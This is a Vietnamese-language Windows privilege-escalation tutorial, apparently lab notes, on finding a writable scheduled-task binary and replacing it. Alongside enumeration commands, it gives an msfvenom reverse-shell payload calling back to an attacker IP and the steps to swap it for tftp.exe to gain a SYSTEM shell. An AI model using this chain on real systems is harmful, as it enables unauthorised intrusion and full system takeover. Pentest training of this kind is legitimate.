# Hunting for Scheduled Tasks

Trước khi đi sâu vào việc liệt kê các tác vụ đã lên lịch, chúng ta cần hiểu khả năng hiển thị của mình với tư cách là một người dùng chuẩn.

Thật không may cho chúng tôi với tư cách là kẻ tấn công, Microsoft đã thực hiện một điều khá thông minh và chỉ cho phép người dùng tiêu chuẩn xem các tác vụ đã lên lịch thuộc về họ. Điều này có nghĩa là bất kỳ tác vụ nào chúng tôi quan tâm, chẳng hạn như những tác vụ do quản trị viên tạo, chúng tôi sẽ không thấy khi cố gắng truy vấn chúng.

Ví dụ: nếu chúng ta sử dụng lệnh sau với quyền quản trị, chúng ta có thể truy vấn tác vụ đã lên lịch để tìm thông tin về cách thức hoạt động của nó:

```
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
```
![image-303-1024x170](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/2d93bb51-8ba8-4bc0-a078-a8cb7315209e)

Điều này cung cấp cho chúng tôi rất nhiều thông tin tốt về nhiệm vụ. Để bắt đầu, tên tác vụ là “Sao lưu”. Ngoài ra, chúng ta có thể thấy rằng tác vụ chạy năm phút một lần và thực thi dưới dạng HỆ THỐNG.

Lưu ý rằng nhiệm vụ này được đặt lên hàng đầu vì hai lý do. Đó là tùy chỉnh và do đó “mới” hơn những cái khác. Ngoài ra, các tác vụ đã lên lịch được liệt kê theo thứ tự theo thư mục, trong trường hợp này đã được đặt bằng thư mục gốc ( \ ). Điều này là phổ biến đối với các tác vụ tùy chỉnh vì không bắt buộc phải thêm thư mục thực và đây là mặc định nên nó thường được giữ nguyên.

Chúng ta có thể thực hiện tìm kiếm tương tự bằng PowerShell và lệnh sau:

```
Get-ScheduledTask
```
![image-282](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/9d80b01f-2365-4978-af4a-666e98d4b112)

Tìm kiếm PowerShell chỉ cung cấp ba trường thông tin; tuy nhiên đầu ra sạch hơn và dễ dàng phát hiện các ngoại lệ. Từ đây, chúng ta có thể lấy tên của nhiệm vụ mà chúng ta quan tâm và nhận tất cả thông tin về nhiệm vụ cụ thể đó bằng lệnh **schtasks** .

Hãy thử lại lệnh **Get-ScheduledTask** hàng đầu , nhưng lần này với tư cách là người dùng chuẩn.

![image-283](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/14fdc31a-ea42-4c55-8db6-b7ccf6e5537b)

Như mong đợi và đã đề cập trước đó, tìm kiếm này KHÔNG hiển thị tác vụ tùy chỉnh được tạo bởi người dùng khác…

# Basic Enumeration Leads to Interesting Finding

Trong ví dụ này, chúng tôi vừa khai thác một máy chủ web trên máy chủ, dẫn đến Shell đảo ngược PowerShell là người dùng chuẩn **john** .

![image-267](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/e250cd5f-2d73-4226-934d-faccc1045947)


Bây giờ chúng ta đã có được chỗ đứng, chúng ta có thể bắt đầu với một số phép liệt kê thủ công để tìm kiếm các chiến thắng nhanh chóng và các tệp thú vị.
Tôi sẽ thực hiện việc này theo cách khác và chỉ ra cách tôi bắt đầu liệt kê trên máy chủ mục tiêu và cách các lệnh thủ công của tôi sẽ dẫn đến việc tìm thấy những gì có vẻ là một tác vụ đã lên lịch.
Đầu tiên, chúng ta cần kiểm tra các đặc quyền của mình.

```
whoami /priv
```
![image-268](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/80ca4c8c-a3df-4c15-b401-507b8974e14d)

Chúng ta có thể thấy rằng chúng ta có các đặc quyền của người dùng tiêu chuẩn; tuy nhiên, chúng tôi có đặc quyền SeShutdown, đặc quyền này có thể hữu ích nếu có một dịch vụ dễ bị tấn công trên máy này.
Tiếp theo, chúng ta nên thu thập một số thông tin về hệ thống mục tiêu của mình bằng lệnh sau:

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```
![image-269-1024x109](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/7f5c4875-7e6d-4ffb-9bf8-71439d5973f2)

Ở đây chúng ta có thể thấy rằng hệ thống này là Windows 10 Pro – Build 17134 – Phiên bản 1803, với kiến trúc dựa trên x64. Chúng ta cũng có thể thấy rằng chỉ có một hotfix duy nhất được cài đặt, điều này cho thấy hệ thống này có thể dễ bị khai thác kernel.

Tiếp theo, chúng ta nên nhanh chóng kiểm tra mọi thông tin xác thực được lưu trữ trên hệ thống.

```
cmdkey /list
```
![image-272](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/3e290804-0eda-4d76-8dfa-b9a6062e2609)

Không có thông tin xác thực được lưu trữ trên máy chủ này. Hãy kiểm tra xem người dùng của chúng tôi có phải là nhóm thú vị không.

```
net user john
```
![image-271](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/6a7c700a-5492-44dd-9781-53af79753606)

Không có gì quan tâm được tìm thấy từ tìm kiếm của người dùng. Bây giờ hãy xem ai nằm trong nhóm quản trị viên cục bộ.

```
net localgroup administrators
```
![image-273](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/9871327c-6074-40ab-896e-03d4577037fa)

Có vẻ như chỉ có tài khoản Quản trị viên tích hợp mới có quyền riêng tư của quản trị viên trên máy chủ này.

Tiếp tục, chúng ta nên tìm kiếm mọi thư mục / tệp không chuẩn trong C:\cũng như cả hai thư mục Tệp chương trình. Lệnh sau sẽ hiển thị tất cả các tệp và thư mục trong thư mục C:\, bao gồm cả các tệp và thư mục ẩn.

```
cmd.exe /c dir /a C:\
```
![image-276](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/fcb2706d-aa7c-4ced-bd71-edbe5564dafb)

Từ đây, các thư mục thú vị nhất là Nhiệm vụ tùy chỉnh, Inetpub (máy chủ web) và cả thư mục Tệp chương trình.

Vì Nhiệm vụ tùy chỉnh là một thư mục không mặc định trong C:\, nên đó là nơi chúng tôi muốn bắt đầu liệt kê.

Nếu không tìm thấy gì trong các thư mục không mặc định được tìm thấy trong C:\, thì thư mục tiếp theo tôi sẽ liệt kê là máy chủ web để thử tìm các tệp thú vị và hy vọng có mật khẩu. Từ đó, tôi sẽ chuyển sang các thư mục Tệp chương trình và một lần nữa, tôi sẽ tìm kiếm các ứng dụng không mặc định trong cả hai thư mục đó.

Chúng ta có thể liệt kê các tệp và thư mục trong thư mục Tác vụ tùy chỉnh bằng lệnh sau:

```
cmd.exe /c dir /a "C:\Custom Tasks"
```

Có một thư mục con bên trong thư mục Nhiệm vụ tùy chỉnh: “Sao lưu”.
Bất cứ khi nào bạn tìm thấy một thư mục sao lưu trên máy chủ, các giác quan của Người Nhện của bạn sẽ bắt đầu ngứa ran!
Liệt kê thư mục Backup tiếp theo chúng ta thấy bên trong có 2 file **backup_log.txt** và **tftp.exe**
```
cmd.exe /c dir /a "C:\Custom Tasks\Backup"
```
![image-277](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/0de2c6f6-f0a7-482a-89f0-e2b7735f4f7c)

Trước tiên, khi kiểm tra tệp nhật ký, chúng tôi được gợi ý rất nhiều về một tác vụ đã lên lịch đang chạy trên máy chủ; và dựa trên dấu thời gian, có vẻ như nó đang chạy TFTP để tạo bản sao lưu cứ sau 5 phút.

![image-280](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d4fc0be7-fb08-403f-a266-46effb98cecf)

Bây giờ chúng tôi đã tìm thấy những gì có vẻ là một tác vụ được lên lịch tiềm năng đang chạy ra khỏi thư mục này, chúng tôi cần liệt kê thêm điều này.

# Liệt kê quyền của thư mục

Trong ví dụ trên, chúng tôi đã thực hiện một số liệt kê thủ công, dẫn chúng tôi đến một thư mục sao lưu thú vị chứa tệp nhật ký gợi ý về một tác vụ đã lên lịch đang chạy.

Vì chúng tôi biết mình quan tâm đến thư mục nào nên chúng tôi có thể kiểm tra quyền của mình trên thư mục đó bằng lệnh icacls tích hợp . Ngoài ra, chúng ta cũng có thể sử dụng một công cụ có tên accesschk từ Bộ công cụ Sysinternals để liệt kê các quyền của thư mục và tệp.

## Liệt kê quyền của thư mục – icacls

Đầu tiên, chúng ta sẽ xem cách có thể sử dụng lệnh **icacls** để kiểm tra quyền của ACL thư mục và tệp.
Các quyền mà chúng tôi đang tìm kiếm trên thư mục Sao lưu là một trong ba quyền sau:

- (F) Kiểm soát hoàn toàn
- (M) Sửa đổi
- (W) Viết

Các quyền của người dùng / nhóm mà chúng tôi đang tìm kiếm như sau:
- Người dùng chúng tôi hiện đang đăng nhập với tên (%USERNAME%)
- Authenticated Users
- Everyone
- BUILTIN\Users
- NT AUTHORITY\INTERACTIVE
  Chúng tôi muốn kiểm tra quyền của cả thư mục Sao lưu cũng như quyền trên chính tệp thực thi. Bắt đầu với thư mục vì rất có thể các quyền của tệp sẽ được kế thừa từ các quyền của thư mục. Đây là hành vi mặc định; tuy nhiên, đôi khi chúng ta có thể thấy rằng thư mục không thể ghi được nhưng tập tin thì có.

```
icacls "C:\Custom Tasks\Backup"

icacls "C:\Custom Tasks\Backup\tftp.exe"
```
![image-285](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/8f8fdd8b-3d9c-4a61-9e18-1d0da6359958)

## Liệt kê quyền của thư mục – Accesschk

Với accesschk trên nạn nhân, bây giờ chúng ta có thể sử dụng lệnh sau để liệt kê các quyền trên thư mục và tệp quan tâm. Bắt đầu với thư mục:

```
.\accesschk64.exe -wvud "C:\Custom Tasks\Backup" -accepteula
```
![image-290](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/dd96d939-a8ac-402f-9d91-902033988083)

Ở đây, chúng ta có thể thấy rằng người dùng được xác thực có sẵn tất cả các quyền sửa đổi, tương tự như những gì chúng ta đã thấy khi sử dụng icacls.

Với khóa chuyển '-d', nó sẽ kiểm tra quyền của chính thư mục đó; và nếu không có khóa chuyển '-d', nó sẽ kiểm tra quyền của TẤT CẢ các tệp trong thư mục.

Tương tự như icacls một lần nữa, chúng ta có thể kiểm tra quyền của tệp mà chúng ta quan tâm bằng cách sử dụng lệnh sau:

```
.\accesschk64.exe -wvu "C:\Custom Tasks\Backup\tftp.exe" -accepteula
```

![image-289](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/4f60f783-42fe-4f0d-9985-8f9eb20f3848)

# Khai thác tác vụ theo lịch trình để lấy SYSTEM Shell

Bây giờ chúng ta đã tìm thấy một tác vụ được lên lịch, chúng ta cần tạo phần mềm độc hại của riêng mình để thay thế tác vụ nhị phân hợp pháp.
Cách nhanh nhất để thực hiện việc này là sử dụng msfvenom và lệnh sau:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f exe -o tftp.exe
```
![image-291](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/cf008208-e19f-4db2-8004-de7ca594a2c8)

Khi mã khai thác đã sẵn sàng, điều tiếp theo chúng ta cần làm là chuyển nó cho nạn nhân và sau đó khởi động trình nghe netcat trên máy tấn công của chúng ta.

![image-292](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/9a4abc83-0bab-412a-9ab2-4748a221cc49)

Tiếp theo chúng ta cần tạo một bản sao lưu của tệp nhị phân gốc, như sau:

```
mv "C:\Custom Tasks\Backup\tftp.exe" "C:\Custom Tasks\Backup\tftp.exe.bak"
```
![image-293](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/07c67089-2038-4d35-93b3-dace8e2fe098)

Cuối cùng, chúng ta cần chuyển phiên bản độc hại của tftp.exe vào thư mục C:\Custom Tasks\Backup.

```
mv .\tftp.exe "C:\Custom Tasks\Backup"
```
![image-294](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/4f481e5a-4eba-4f47-9846-23e34490adee)

Đi uống cà phê rồi quay lại; và khi chúng tôi kiểm tra trình nghe của mình, chúng tôi có shell HỆ THỐNG!

![image-295](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/fac43ca6-e4ba-4996-b283-f891d7fac772)
